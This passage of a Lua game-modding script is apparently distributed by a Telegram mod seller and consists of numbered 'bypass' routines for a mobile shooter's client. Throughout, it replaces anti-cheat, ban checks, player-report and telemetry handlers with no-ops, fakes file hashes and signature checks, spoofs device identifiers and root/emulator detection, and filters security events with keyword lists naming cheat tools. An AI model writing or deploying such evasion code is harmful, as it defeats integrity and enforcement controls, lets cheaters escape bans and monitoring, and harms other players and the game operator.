            Client.TPerforPlatDisconnectReport = nop
            Client.IsConnected = function(NetInterface) return true end
            Client.GetUnrealNetworkStatus = nopstr
            Client.MD5LuaString = function(str) return "BYPASSED_MD5" end
            Client.GetDSVersion = function() return "999.999.999" end
            Client.IsInReplayState = nopfalse
        end
        
        if NetManager then
            NetManager.ProcRespondMsg = nop
            NetManager.isLogMsgAfterLogin = false
            NetManager.logMsgMap = {}
        end
        
        if EventSystem then
            local oldPost = EventSystem.postEvent
            EventSystem.postEvent = function(eventType, eventID, ...)
                if eventID and type(eventID) == "string" then
                    local blocked = {"SECURITY", "CHEAT", "BAN", "REPORT", "FLAG", 
                                    "VIOLATION", "DETECT", "VERIFY", "ANTI", "AC_",
                                    "SUSPICIOUS", "ABNORMAL", "MONITOR", "TRACK",
                                    "TELEMETRY", "ANALYTICS", "CRASH", "DUMP",
                                    "MAGIC", "BULLET", "HITBOX", "DAMAGE", "SHOOT",
                                    "PROJECTILE", "VERIFICATION", "VALIDATION",
                                    "SKIN", "AVATAR", "WEAPON", "VEHICLE", "EQUIPMENT",
                                    "GAMEGUARDIAN", "CHEATENGINE", "ROOT", "JAILBREAK",
                                    "EMULATOR", "TAMPER", "SPEEDHACK", "ESP", "WALLHACK",
                                    "NORECOIL", "PLAYERREPORT", "REPORTCOOLDOWN"}
                    for _, be in ipairs(blocked) do
                        if eventID:find(be) then return end
                    end
                end
                if oldPost then oldPost(eventType, eventID, ...) end
            end
        end
        
        local logFuncs = {"log", "log_warning", "log_error", "log_shipping_client", "log_format", "log_tree"}
        for _, funcName in ipairs(logFuncs) do
            if _G[funcName] then
                _G[funcName] = function(...)
                    local args = {...}
                    for _, arg in ipairs(args) do
                        if type(arg) == "string" and (
                            arg:find("cheat") or arg:find("security") or arg:find("ban") or
                            arg:find("detect") or arg:find("verify") or arg:find("integrity") or
                            arg:find("report") or arg:find("violation") or arg:find("hack") or
                            arg:find("anti") or arg:find("ac_") or arg:find("suspicious") or
                            arg:find("abnormal") or arg:find("monitor") or arg:find("track") or
                            arg:find("magic") or arg:find("bullet") or arg:find("hitbox") or
                            arg:find("damage") or arg:find("shoot") or arg:find("projectile") or
                            arg:find("skin") or arg:find("avatar") or arg:find("weapon") or
                            arg:find("vehicle") or arg:find("equipment") or
                            arg:find("gameguardian") or arg:find("cheatengine") or
                            arg:find("root") or arg:find("jailbreak") or
                            arg:find("emulator") or arg:find("tamper") or
                            arg:find("speedhack") or arg:find("esp") or arg:find("wallhack") or
                            arg:find("norecoil") or arg:find("playerreport")
                        ) then return end
                    end
                end
            end
        end
        
        if LogUtil then
            LogUtil.SetForceLog = nop
            LogUtil.SetLogTreeEnable = nop
            LogUtil.SetWriteLog = nop
        end
        
        if sandbox then 
            sandbox.LogError = nop
            sandbox.LogWarning = nop 
        end
    end)
    print("[BYPASS] ✅ Client Entry Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 29. HiggsBoson Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function HiggsBosonBypass()
    pcall(function()
        if CHiggsBosonComponent then
            CHiggsBosonComponent.ReceiveBeginPlay = nop
            CHiggsBosonComponent.StaticShowSecurityAlertInDev = nop
            CHiggsBosonComponent.ShowABCD = nop
            CHiggsBosonComponent._ClientShowSecurityAlertWindow = nop
            CHiggsBosonComponent._ReportChatRobot = nop
            CHiggsBosonComponent.SendAntiDataFlow = nop
            CHiggsBosonComponent.SendHitFireBtnFlow = nop
            CHiggsBosonComponent.OnBattleResult = nop
            CHiggsBosonComponent.SendHisarData = nop
            CHiggsBosonComponent.RPC_Client_ShowSecurityAlertWindow = nop
            CHiggsBosonComponent.RPC_Server_TellServerName = nop
            CHiggsBosonComponent.RecordStrategyTimestampInReplay = nop
            CHiggsBosonComponent.SkipAlertServer = nop
            CHiggsBosonComponent.SetClientAlertWindowEnabled = nop
            CHiggsBosonComponent.IsCharacterOwnerWerewolf = nopfalse
            CHiggsBosonComponent.IsCharacterOwnerButcher = nopfalse
            CHiggsBosonComponent._ProcessReportChatRobotQueue = nop
            CHiggsBosonComponent.LuaNotifySecurityAbnormalJump = nop
            CHiggsBosonComponent.bSkipAlertServer = true
            CHiggsBosonComponent.bMHActive = false
            CHiggsBosonComponent.bCallPreReplication = false
            bIsSkipAlertServer = true
            bSkipUploadNoschat = true
            _nReportNosChatTimerID = nil
            _nReportNosChatMessageID = 0
            _tReportNosChatQueue = {}
            LastTimeHandleAlert = -1
        end
        
        local GameplayData = _safe_require("GameLua.GameCore.Data.GameplayData")
        if GameplayData then
            local pc = GameplayData.GetPlayerController()
            if _isValid(pc) then
                if pc.HiggsBoson then
                    pc.HiggsBoson.bMHActive = false
                    pc.HiggsBoson.bCallPreReplication = false
                    pc.HiggsBoson.bSkipAlertServer = true
                end
                if pc.HiggsBosonComponent then
                    pc.HiggsBosonComponent.bMHActive = false
                    pc.HiggsBosonComponent.bCallPreReplication = false
                    pc.HiggsBosonComponent.bSkipAlertServer = true
                end
            end
        end
        
        local ticker = _safe_require("common.time_ticker")
        if ticker and ticker.AddTimerLoop then
            ticker.AddTimerLoop(1.0, function()
                pcall(function()
                    local GameplayData = _safe_require("GameLua.GameCore.Data.GameplayData")
                    if GameplayData then
                        local pc = GameplayData.GetPlayerController()
                        if _isValid(pc) then
                            if pc.HiggsBoson then
                                pc.HiggsBoson.bMHActive = false
                                pc.HiggsBoson.bCallPreReplication = false
                            end
                            if pc.HiggsBosonComponent then
                                pc.HiggsBosonComponent.bMHActive = false
                                pc.HiggsBosonComponent.bCallPreReplication = false
                            end
                        end
                    end
                end)
            end, -1, 1.0)
        end
    end)
    print("[BYPASS] ✅ HiggsBoson Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 30. HawkEye Patrol Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function HawkEyeBypass()
    pcall(function()
        if ClientHawkEyePatrolSubsystem then
            ClientHawkEyePatrolSubsystem._OnHawkSync = nop
            ClientHawkEyePatrolSubsystem._OnHawkReportSuccess = nop
            ClientHawkEyePatrolSubsystem._OnRecvInspectorBroadcastCount = nop
            ClientHawkEyePatrolSubsystem.ReportCheat = nop
            ClientHawkEyePatrolSubsystem.RequestImprison = nop
            ClientHawkEyePatrolSubsystem.SendReportTLog = nop
            ClientHawkEyePatrolSubsystem.IsDuringHawkEyePatrol = nopfalse
            ClientHawkEyePatrolSubsystem._CollectBeWatchedPlayerInfo = nop
            ClientHawkEyePatrolSubsystem.HasReported = noptrue
            ClientHawkEyePatrolSubsystem.GetBeWatchedPlayerInfo = nopnil
            ClientHawkEyePatrolSubsystem._OnPlayerKilledOtherPlayer = nop
            ClientHawkEyePatrolSubsystem._StartFrameUIRefreshTimer = nop
            ClientHawkEyePatrolSubsystem.ExitWatching = nop
            ClientHawkEyePatrolSubsystem.WantMatchNextPatrol = nop
            ClientHawkEyePatrolSubsystem._InitHawkEyePatrolSubsystem = function(self)
                self._bHasInitialized = true
                self._bHasReported = true
            end
            ClientHawkEyePatrolSubsystem._StartHideUITimer = nop
            ClientHawkEyePatrolSubsystem._StartShowDistanceUITimer = nop
            ClientHawkEyePatrolSubsystem._StartCloseBattleEndedTipsTimer = nop
            ClientHawkEyePatrolSubsystem._StartBattleTimeUsageTimer = nop
            ClientHawkEyePatrolSubsystem._StartQuitVoiceRoomTimer = nop
            ClientHawkEyePatrolSubsystem._StartExitGameTimer = nop
            ClientHawkEyePatrolSubsystem._CloseExitGameTimer = nop
            ClientHawkEyePatrolSubsystem._CreateOvertimerTimerForNextPatrol = nop
            ClientHawkEyePatrolSubsystem.ClearNextPatrolOvertimeTimer = nop
            ClientHawkEyePatrolSubsystem.ReturnLobbyAndOpenH5 = nop
            ClientHawkEyePatrolSubsystem.ForceNeverCloseBattleEndedTips = nop
            ClientHawkEyePatrolSubsystem.CheckShowReportedTips = nopfalse
            ClientHawkEyePatrolSubsystem.TryShowReportedTips = nop
            ClientHawkEyePatrolSubsystem.ShowWatchEndedTips = nop
            ClientHawkEyePatrolSubsystem.HasShownWatchEndedTips = noptrue
            ClientHawkEyePatrolSubsystem.OnShowWatchEndedTips = nop
            ClientHawkEyePatrolSubsystem.OnClickLowerLeftExitWatching = nop
            ClientHawkEyePatrolSubsystem.OnClickBottomRightOpenReportWindow = nop
            ClientHawkEyePatrolSubsystem._MarkHasReported = nop
            ClientHawkEyePatrolSubsystem.GetForbidNextPatrolRemainingTimeInSeconds = function() return 0 end
            ClientHawkEyePatrolSubsystem.GetUsedDailyTimeInSeconds = function() return 0 end
            ClientHawkEyePatrolSubsystem.GetInspectorBroadcastCount = function() return -1 end
            ClientHawkEyePatrolSubsystem.GetMaxInspectorBroadcastCount = function() return 0 end
            ClientHawkEyePatrolSubsystem.CanInspectorBroadcast = nopfalse
            ClientHawkEyePatrolSubsystem.IsCharacterLocationShouldDraw = nopfalse
            ClientHawkEyePatrolSubsystem.InitHawkEyePatrolSubsystem = nop
            ClientHawkEyePatrolSubsystem._PostConstruct = function(self)
                self._bHasInitialized = true
                self._bHasReported = true
                self.nInspectorBroadcastCount = -1
            end
            ClientHawkEyePatrolSubsystem.OnRelease = nop
            ClientHawkEyePatrolSubsystem._bHasInitialized = true
            ClientHawkEyePatrolSubsystem._bHasReported = true
            ClientHawkEyePatrolSubsystem._bHasShownWatchEndedTips = true
            ClientHawkEyePatrolSubsystem.bShowBeReportedTips = true
            ClientHawkEyePatrolSubsystem.nInspectorBroadcastCount = -1
        end
        if DSHawkEyePatrolSubsystem then
            DSHawkEyePatrolSubsystem.OnInit = nop
            DSHawkEyePatrolSubsystem.ReportCheat = nop
            DSHawkEyePatrolSubsystem.RequestImprison = nop
        end
    end)
    print("[BYPASS] ✅ HawkEye Patrol Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 31. Ban Logic Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function BanLogicBypass()
    pcall(function()
        if ClientBanLogic then
            ClientBanLogic.ReqBanInfo = nop
            ClientBanLogic.OnVoiceSwitchNotify = nop
            ClientBanLogic.OnVoiceBanNotify = nop
            ClientBanLogic.OnRealTimeVoiceBanNotify = nop
            ClientBanLogic.OnVoiceBanSuccess = nop
            ClientBanLogic.TryOpenVoice = function()
                EventSystem:postEvent(EVENTTYPE_INGAME_BAN, EVENTID_INGAME_BAN_FORBID_VOICE, false)
            end
            ClientBanLogic.IsVoiceReportEnable = nopfalse
            ClientBanLogic.OnSyncMicSuspicious = nop
            ClientBanLogic.OnSyncMicPreFilter = nop
            ClientBanLogic.OnSyncBanInfo = nop
            ClientBanLogic.OnNotifyWarningTips = nop
            ClientBanLogic.VoiceBanEndTime = 0
            ClientBanLogic.bEnableVoiceReport = false
            ClientBanLogic.SuspiciousFlag = 0
            ClientBanLogic.Reason = ""
            ClientBanLogic.IsTranslated = false
            ClientBanLogic.CheckBan = retFalse
            ClientBanLogic.IsBanned = retFalse
            ClientBanLogic.CheckBanStatus = retFalse
            ClientBanLogic.GetBanInfo = retEmpty
        end
        if RealTimeBan then
            RealTimeBan.Init = function() return end
            RealTimeBan.OnPlayerWithRealTimeBan = nop
            RealTimeBan.OnSyncPlayerInfo = nop
            RealTimeBan.HandleEnterGameModeFightingState = nop
            RealTimeBan.ShowAlias = nop
            RealTimeBan.SetOnRankInspectorUID = nop
            RealTimeBan.IsUIDOnRankInspector = nopfalse
            RealTimeBan.GetUIDInspectorRank = function() return -1 end
            RealTimeBan.SetInspectorBroadcastCountUID = nop
            RealTimeBan.GetUIDInspectorBroadcastCount = function() return -1 end
            RealTimeBan.GetTipsIDOffset = function() return 0 end
            RealTimeBan.GetTipsIDOffsetWithUID = function() return 0 end
            RealTimeBan.GetTipsIDOffsetInspector = function() return 0 end
            RealTimeBan.GMShowAlias = nop
            RealTimeBan.tOnRankInspectorUIDSet = {}
            RealTimeBan.tInspectorRankUIDSet = {}
            RealTimeBan.tInspectorBroadcastCountUIDSet = {}
            RealTimeBan.MaxAliasLevel = -1
            RealTimeBan.CurrentAlias = nil
            RealTimeBan.CurrentName = nil
            RealTimeBan.is_onrank_inspector = false
            RealTimeBan.inspector_rank = -1
            RealTimeBan.bHasOldAlias = false
            RealTimeBan.ShowTipsAliasConfig = {}
            RealTimeBan.DelayTime = {}
            RealTimeBan.OldShowTipsAlias = 0
            RealTimeBan.IsBanned = retFalse
            RealTimeBan.GetBanTime = retZero
            RealTimeBan.GetBanReason = retEmptyString
        end
        if BanSystem then
            BanSystem.CheckBan = retFalse
            BanSystem.IsBanned = retFalse
            BanSystem.GetBanReason = retEmptyString
            BanSystem.GetBanTime = retZero
            BanSystem.GetBanType = retZero
            BanSystem.IsPermanentlyBanned = retFalse
        end
        
        if _G.BanStatusCache then _G.BanStatusCache = nil end
        if _G.AccountBanCache then _G.AccountBanCache = {} end
        if _G.TemporaryBan then
            _G.TemporaryBan.BanStart = 0
            _G.TemporaryBan.BanEnd = 0
            _G.TemporaryBan.IsBanned = retFalse
        end
        if _G.Account then
            _G.Account.IsBanned = false
            _G.Account.BanStatus = 0
            _G.Account.WarningLevel = 0
            _G.Account.IsSuspicious = false
            _G.Account.BanExpiry = 0
            _G.Account.BanReason = ""
            _G.Account.BanCount = 0
            _G.Account.RiskLevel = 0
        end
    end)
    print("[BYPASS] ✅ Ban Logic Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 32. Report System Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function ReportSystemBypass()
    pcall(function()
        if ClientReportPlayerSubsystem then
            ClientReportPlayerSubsystem.OnInit = nop
            ClientReportPlayerSubsystem._OnPlayerKilledOtherPlayer = nop
            ClientReportPlayerSubsystem._RecordFatalDamager = nop
            ClientReportPlayerSubsystem._RecordMurdererFromDeathReplayData = nop
            ClientReportPlayerSubsystem._OnSyncFatalDamage = nop
            ClientReportPlayerSubsystem._SyncBattleResult = nop
            ClientReportPlayerSubsystem._OnBattleResult = nop
            ClientReportPlayerSubsystem._OnShowQuickReportMutualExclusiveUI = nop
            ClientReportPlayerSubsystem._OnHideQuickReportMutualExclusiveUI = nop
            ClientReportPlayerSubsystem._StartCheckGameModeTypeTimer = nop
            ClientReportPlayerSubsystem._CheckGameModeType = nop
            ClientReportPlayerSubsystem._StartCheckCurrentNotInTeamHistoricalTeammateTimer = nop
            ClientReportPlayerSubsystem._CheckCurrentNotInTeamHistoricalTeammate = nop
            ClientReportPlayerSubsystem._RecordTeammatePlayerInfo = nop
            ClientReportPlayerSubsystem._IsHealthStatusKilled = nopfalse
            ClientReportPlayerSubsystem.GetFatalDamagerMap = retEmpty
            ClientReportPlayerSubsystem.GetFatalDamagerMapSize = retZero
            ClientReportPlayerSubsystem.GetName2InfoMap = retEmpty
            ClientReportPlayerSubsystem.GetCachedTeammateName2InfoMap = retEmpty
            ClientReportPlayerSubsystem.GetTeammateName2InfoMapDuringBattle = retEmpty
            ClientReportPlayerSubsystem.GetCurrentNotInTeamHistoricalTeammateMap = retEmpty
            ClientReportPlayerSubsystem.GetInTeamIndexFromHistoricalTeammateInfo = function() return -1 end
            ClientReportPlayerSubsystem.IsGameModeTypeTeamDeathMatch = nopfalse
            ClientReportPlayerSubsystem.GetGameModeType = function() return -1 end
            ClientReportPlayerSubsystem.GetMainModeID = function() return -1 end
            ClientReportPlayerSubsystem.GetSubModeID = function() return -1 end
            ClientReportPlayerSubsystem.EnableRecordFatalDamage = nop
            ClientReportPlayerSubsystem._tKnockDownerMap = {}
            ClientReportPlayerSubsystem._tMurdererMap = {}
            ClientReportPlayerSubsystem._ds2history = {}
            ClientReportPlayerSubsystem._tMapCurrentNotInTeamHistoricalTeammate = {}
            ClientReportPlayerSubsystem._tTeammateName2InfoMap = {}
            ClientReportPlayerSubsystem._bEnableRecordFatalDamage = false
            ClientReportPlayerSubsystem._bIsGameModeTypeTeamDeathMatch = false
            ClientReportPlayerSubsystem._nGameModeType = -1
            ClientReportPlayerSubsystem._nMainModeID = -1
            ClientReportPlayerSubsystem._nSubModeID = -1
            ClientReportPlayerSubsystem._nCheckTDMGameModeTypeTimer = nil
            ClientReportPlayerSubsystem._nCurrentNotInTeamHistoricalTeammateTimer = nil
            ClientReportPlayerSubsystem.SubmitReport = nop
            ClientReportPlayerSubsystem.CanReport = retFalse
            ClientReportPlayerSubsystem.ReportPlayer = nop
            ClientReportPlayerSubsystem.ReportCheat = nop
        end
        if DSReportPlayerSubsystem then
            DSReportPlayerSubsystem.OnInit = nop
            DSReportPlayerSubsystem._OnNearDeathOrRescued = nop
            DSReportPlayerSubsystem._OnPlayerSettlementStart = nop
            DSReportPlayerSubsystem._OnTeammateDamage = nop
            DSReportPlayerSubsystem._OnCharacterDied = nop
            DSReportPlayerSubsystem._OnPlayerReconnect = nop
            DSReportPlayerSubsystem._RecordFatalDamager = nop
            DSReportPlayerSubsystem._RecordTeammateMurderer = nop
            DSReportPlayerSubsystem._AddMLKillerUIDToBattleResult = nop
            DSReportPlayerSubsystem._AddFatalDamagerMapToBattleResult = nop
            DSReportPlayerSubsystem._AddKnockDownerToBattleResult = nop
            DSReportPlayerSubsystem._AddKillerToBattleResult = nop
            DSReportPlayerSubsystem._AddTeammateMurderToBattleResult = nop
            DSReportPlayerSubsystem._SaveHistoricalTeammateInfo = nop
            DSReportPlayerSubsystem._SyncFatalDamagerMap = nop
            DSReportPlayerSubsystem._AddGameModeTypeToBattleResult = nop
            DSReportPlayerSubsystem._UpdateMLAIUID = nop
            DSReportPlayerSubsystem._AddEnemyMapToBattleResult = nop
            DSReportPlayerSubsystem._OnNoNetStartUpDoor = nop
            DSReportPlayerSubsystem._AssignTeammateInTeamIndex = nop
            DSReportPlayerSubsystem._FindCacheByUID = function(self, nUID, bAddIfNotExists)
                if bAddIfNotExists then return {} end
                return nil
            end
            DSReportPlayerSubsystem._GetFatalDamagerMap = retEmpty
            DSReportPlayerSubsystem._IsBattleResultTableValid = nopfalse
            DSReportPlayerSubsystem._IsHealthStatusKilled = nopfalse
            DSReportPlayerSubsystem._tUID2InfoMap = {}
            DSReportPlayerSubsystem.nNoStartUpDoorNum = 0
        end
        if ui_complaint then
            ui_complaint.SubmitReportData = function(self) self:CloseWindow(false) return end
            ui_complaint._OnClickReport = function(self) return end
            ui_complaint._AddCommonTypesOfPlayerForReport = function(self) return end
            ui_complaint.AddPlayerForReport = function(self, ...) return end
            ui_complaint.GetSelectedReasonAsArray = retEmpty
            ui_complaint.GetSelectedSubReasonAsArray = retEmpty
            ui_complaint.BlockPlayerChat = function(self) return end
            ui_complaint.IsBlockChatCheck = retFalse
            ui_complaint.CheckBoxBlack = function(self, bCheckState) return end
            ui_complaint.UpdateMatchBlackList = function(self) return end
            ui_complaint._SelectedReasonSet = {}
            ui_complaint._SelectedSubReasonSet = {}
            ui_complaint._SelectedCheatSubReasonSet = {}
            ui_complaint._tPlayerName2InfoMap = {}
            ui_complaint._tPlayerNamesArray = {}
        end
        if LogicComplaint then
            LogicComplaint.Submit = function(...) return end
        end
        
        local ReportCooldown = package.loaded["client.slua.logic.report.ReportCooldownLogic"]
        if ReportCooldown then
            ReportCooldown.CheckCanReport = retFalse
            ReportCooldown.GetCooldownTime = retZero
            ReportCooldown.ResetCooldown = nop
            ReportCooldown.OnReportCooldownEnd = nop
        end
        
        local PlayerReport = package.loaded["client.slua.logic.report.PlayerReportLogic"]
        if PlayerReport then
            PlayerReport.SendReport = nop
            PlayerReport.ReportCheat = nop
            PlayerReport.ReportAbuse = nop
            PlayerReport.ReportAFK = nop
            PlayerReport.ReportTeammate = nop
            PlayerReport.OnReportResponse = nop
        end
    end)
    print("[BYPASS] ✅ Report System Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 33. TLog Report Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function TLogBypass()
    pcall(function()
        if tlog_report_utils then
            tlog_report_utils.ReportTLogEvent = nop
            tlog_report_utils.IsCanReportLobbyEvent = nopfalse
            tlog_report_utils.IsBusinessReport = nopfalse
            tlog_report_utils.SetMarketStayUpdateEnable = nop
            tlog_report_utils.GetMarketStayUpdateEnable = nopfalse
            tlog_report_utils.SetBusinessReportEnable = nop
            tlog_report_utils.SendTLogReportImmediate = nop
            tlog_report_utils.SetTlogBeginType = nop
            tlog_report_utils.SetTlogEndType = nop
            _G.SendTLogReportImmediate = nop
            _extraTlogReportEnableCfg = {}
            _isCanReportMarketStay = false
            _BusinessReportEnable = false
            _isInitConfig = true
            start_timestamp_map = {}
        end
        if ToolReportUtil then
            ToolReportUtil.GetReportSwitch = nopfalse
            ToolReportUtil.GetPackageInfo = nopnil
            ToolReportUtil.ReParseError = function(error, reportType) return error or "" end
            ToolReportUtil.IsReleaseVersion = noptrue
            ToolReportUtil.IsWhite = nopfalse
            ToolReportUtil.IsXPcallOpenInBattle = nopfalse
            ToolReportUtil.IsClientToolOpen = nopfalse
            MyOpenID = false
            MyUID = false
            VersionInfo = nil
        end
        if DSSecurityTLogSubsystem then
            DSSecurityTLogSubsystem.OnInit = nop
            DSSecurityTLogSubsystem._OnReportServerJumpFlow = nop
            DSSecurityTLogSubsystem._OnDevAlert = nop
            DSSecurityTLogSubsystem._InitWhenEditor = nop
            DSSecurityTLogSubsystem._nInitGameSafeCallbacksTimer = nil
        end
        if _G.TLog then
            _G.TLog.Info = nop
            _G.TLog.Warning = nop
            _G.TLog.Error = nop
            _G.TLog.Debug = nop
            _G.TLog.Report = nop
            _G.TLog.Send = nop
            _G.TLog.Flush = nop
        end
    end)
    print("[BYPASS] ✅ TLog Report Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 34. MD5 and Signature Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function MD5Bypass()
    pcall(function()
        local console = import("KismetSystemLibrary")
        if console then
            console.ExecuteConsoleCommand(nil, "pak.DisablePakSignatureCheck 1")
            console.ExecuteConsoleCommand(nil, "pakchunk.EnableSignatureCheck 0")
            console.ExecuteConsoleCommand(nil, "s.VerifyPak 0")
            console.ExecuteConsoleCommand(nil, "sig.Check 0")
            console.ExecuteConsoleCommand(nil, "security.DisableChecks 1")
            console.ExecuteConsoleCommand(nil, "CheatManager.EnableCheat 1")
            console.ExecuteConsoleCommand(nil, "Net.BlockAllAntiCheat 1")
            console.ExecuteConsoleCommand(nil, "AntiCheat.DisableAll 1")
            console.ExecuteConsoleCommand(nil, "t.MaxFPS 165")
        end
        local CMode = import("CreativeModeBlueprintLibrary")
        if CMode then
            CMode.MD5HashByteArray = function() return "00000000000000000000000000000000" end
            CMode.MD5HashFile = function() return "00000000000000000000000000000000" end
            CMode.GetContentDiffData = function() return true, "BYPASSED" end
            CMode.VerifyFileIntegrity = retTrue
        end
        if _G.MD5Hash then _G.MD5Hash = function() return "00000000000000000000000000000000" end end
        if _G.CRC32 then _G.CRC32 = function() return 0 end end
        if _G.SHA1 then _G.SHA1 = function() return "BYPASS" end end
        if _G.SHA256 then _G.SHA256 = function() return "BYPASS" end end
        if _G.FileHashChecker then
            _G.FileHashChecker.CheckFileMD5 = retTrue
            _G.FileHashChecker.VerifyAll = retTrue
            _G.FileHashChecker.GetHash = function() return "BYPASS" end
        end
        if _G.STExtraBlueprintFunctionLibrary then
            _G.STExtraBlueprintFunctionLibrary.CheckMD5 = retTrue
            _G.STExtraBlueprintFunctionLibrary.GetMD5 = function() return "BYPASS" end
            _G.STExtraBlueprintFunctionLibrary.VerifyFile = retTrue
            _G.STExtraBlueprintFunctionLibrary.VerifySignature = retTrue
            _G.STExtraBlueprintFunctionLibrary.CheckIntegrity = retTrue
        end
        if _G.CRC then
            _G.CRC.VerifyFile = retTrue
            _G.CRC.VerifyMemory = retTrue
            _G.CRC.GenerateCRC = function() return "00000000" end
        end
        if _G.CRCChecker then
            _G.CRCChecker.VerifyFile = retTrue
            _G.CRCChecker.VerifyMemory = retTrue
            _G.CRCChecker.GenerateCRC = function() return "00000000" end
            _G.CRCChecker.CheckIntegrity = retTrue
            _G.CRCChecker.ValidateFile = retTrue
            _G.CRCChecker.ValidateMemory = retTrue
            _G.CRCChecker.CheckFile = retTrue
            _G.CRCChecker.CheckMemory = retTrue
            _G.CRCChecker.VerifyCRC = retTrue
            _G.CRCChecker.ValidateCRC = retTrue
            _G.CRCChecker.CheckCRC = retTrue
            _G.CRCChecker.GenerateCRC32 = function() return "00000000" end
            _G.CRCChecker.GenerateCRC64 = function() return "0000000000000000" end
            _G.CRCChecker.GenerateMD5 = function() return "00000000000000000000000000000000" end
            _G.CRCChecker.GenerateSHA1 = function() return "0000000000000000000000000000000000000000" end
            _G.CRCChecker.GenerateSHA256 = function() return "0000000000000000000000000000000000000000000000000000000000000000" end
        end
    end)
    print("[BYPASS] ✅ MD5 and Signature Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 35. DNS and Device Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function DNSDeviceBypass()
    pcall(function()
        local DeviceID = import("DeviceID")
        if DeviceID then
            DeviceID.GetDeviceID = function() return "BYPASSED_DEVICE" end
            DeviceID.GetAndroidID = function() return "BYPASSED_ANDROID_ID" end
            DeviceID.GetIMEI = function() return "BYPASSED_IMEI" end
            DeviceID.GetMACAddress = function() return "BYPASSED_MAC" end
            DeviceID.GetUniqueDeviceID = function() return "BYPASSED_UNIQUE" end
            DeviceID.GetDeviceName = function() return "BYPASSED_DEVICE_NAME" end
            DeviceID.GetDeviceModel = function() return "BYPASSED_MODEL" end
            DeviceID.GetDeviceBrand = function() return "BYPASSED_BRAND" end
            DeviceID.GetDeviceManufacturer = function() return "BYPASSED_MANUFACTURER" end
            DeviceID.GetDeviceBoard = function() return "BYPASSED_BOARD" end
            DeviceID.GetDeviceBootloader = function() return "BYPASSED_BOOTLOADER" end
            DeviceID.GetDeviceHardware = function() return "BYPASSED_HARDWARE" end
            DeviceID.GetDeviceHost = function() return "BYPASSED_HOST" end
            DeviceID.GetDeviceFingerprint = function() return "BYPASSED_FINGERPRINT" end
            DeviceID.GetDeviceSerial = function() return "BYPASSED_SERIAL" end
            DeviceID.GetDeviceUUID = function() return "BYPASSED_UUID" end
            DeviceID.GetDeviceAdId = function() return "BYPASSED_ADID" end
        end
        
        local SystemInfo = import("SystemInfo")
        if SystemInfo then
            SystemInfo.GetDeviceModel = function() return "iPhone14,5" end
            SystemInfo.GetDeviceBrand = function() return "Apple" end
            SystemInfo.GetAndroidVersion = function() return "13" end
            SystemInfo.GetEMUIVersion = function() return "" end
            SystemInfo.IsEmulator = retFalse
            SystemInfo.IsRooted = retFalse
            SystemInfo.IsDebugged = retFalse
            SystemInfo.GetKernelVersion = function() return "Linux version 4.14.116" end
            SystemInfo.CheckKernelIntegrity = retTrue
            SystemInfo.GetDeviceID = function() return "00000000-0000-0000-0000-000000000000" end
            SystemInfo.GetDeviceName = function() return "iPhone" end
            SystemInfo.GetDeviceType = function() return "Phone" end
            SystemInfo.GetManufacturer = function() return "Apple" end
            SystemInfo.GetModel = function() return "iPhone14,5" end
            SystemInfo.GetOSVersion = function() return "13" end
            SystemInfo.GetOSName = function() return "iOS" end
            SystemInfo.GetScreenResolution = function() return "1170x2532" end
            SystemInfo.GetScreenDensity = function() return "460" end
            SystemInfo.GetRAMSize = function() return "6144" end
            SystemInfo.GetStorageSize = function() return "256" end
            SystemInfo.GetBatteryLevel = function() return "100" end
            SystemInfo.GetBatteryStatus = function() return "Charging" end
            SystemInfo.GetNetworkType = function() return "WiFi" end
            SystemInfo.GetNetworkSpeed = function() return "100" end
            SystemInfo.GetGPSStatus = function() return "Enabled" end
            SystemInfo.GetGPSLocation = function() return "0.0,0.0" end
            SystemInfo.GetCountryCode = function() return "US" end
            SystemInfo.GetLanguageCode = function() return "en" end
            SystemInfo.GetTimeZone = function() return "UTC" end
            SystemInfo.GetCurrentTime = function() return os.time() end
            SystemInfo.GetUptime = function() return 3600 end
            SystemInfo.GetCPUUsage = function() return 10 end
            SystemInfo.GetMemoryUsage = function() return 20 end
            SystemInfo.GetTemperature = function() return 25 end
            SystemInfo.GetBatteryTemperature = function() return 25 end
            SystemInfo.GetCPUFrequency = function() return 2400 end
            SystemInfo.GetGPUFrequency = function() return 1200 end
            SystemInfo.GetScreenBrightness = function() return 100 end
            SystemInfo.GetVolumeLevel = function() return 100 end
        end
        
        local sys = import("KismetSystemLibrary")
        if sys then
            sys.GetDeviceId = function() return "FAKE_DEVICE_" .. math.random(100000,999999) end
            sys.GetMacAddress = function() return "00:11:22:33:44:55" end
            sys.GetSerialNumber = function() return "SN" .. math.random(1000000,9999999) end
        end
        
        if _G.DeviceInfo then
            _G.DeviceInfo.IsEmulator = false
            _G.DeviceInfo.IsRooted = false
            _G.DeviceInfo.IsDebug = false
            _G.DeviceInfo.IsJailbroken = false
            _G.DeviceInfo.IsDeveloperMode = false
            _G.DeviceInfo.IsUSBConnected = false
            _G.DeviceInfo.IsModded = false
            _G.DeviceInfo.IsHooked = false
            _G.DeviceInfo.IsVirtualMachine = false
            _G.DeviceInfo.IsSimulator = false
            _G.DeviceInfo.DeviceID = "BYPASS-DEVICE-2026"
            _G.DeviceInfo.DeviceSignature = "VALID-SIGNATURE"
        end
    end)
    print("[BYPASS] ✅ DNS and Device Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 36. Gokuba Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function GokubaBypass()
    pcall(function()
        local Gokuba = package.loaded["GameLua.Mod.BaseMod.Client.Security.Gokuba"]
        if Gokuba then
            Gokuba.ForwardFeature = function() return {0,0,0,0,0} end
            Gokuba.InitGokubaLogic = nop
            if Gokuba.TimerHandle then
                local time_ticker = _safe_require("common.time_ticker")
                time_ticker.RemoveTimer(Gokuba.TimerHandle)
